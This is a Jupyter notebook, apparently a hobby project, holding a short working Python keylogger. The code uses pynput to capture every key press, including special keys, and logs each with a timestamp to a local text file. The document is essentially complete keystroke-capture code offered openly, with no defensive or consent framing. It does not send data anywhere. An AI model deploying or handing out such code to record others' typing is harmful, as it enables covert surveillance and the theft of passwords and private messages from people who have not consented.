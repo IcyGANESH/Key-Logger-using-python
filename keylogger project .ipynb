{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0162916e-b1ec-4772-ac13-a06bcfb5db95",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput import keyboard\n",
    "import logging\n",
    "\n",
    "# Set the path for the log file\n",
    "log_file = \"key_log.txt\"\n",
    "\n",
    "# Configure logging\n",
    "logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')\n",
    "\n",
    "def on_press(key):\n",
    "    try:\n",
    "        logging.info(f\"Key pressed: {key.char}\")\n",
    "    except AttributeError:\n",
    "        logging.info(f\"Special key pressed: {key}\")\n",
    "\n",
    "# Start the keylogger\n",
    "with keyboard.Listener(on_press=on_press) as listener:\n",
    "    listener.join()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
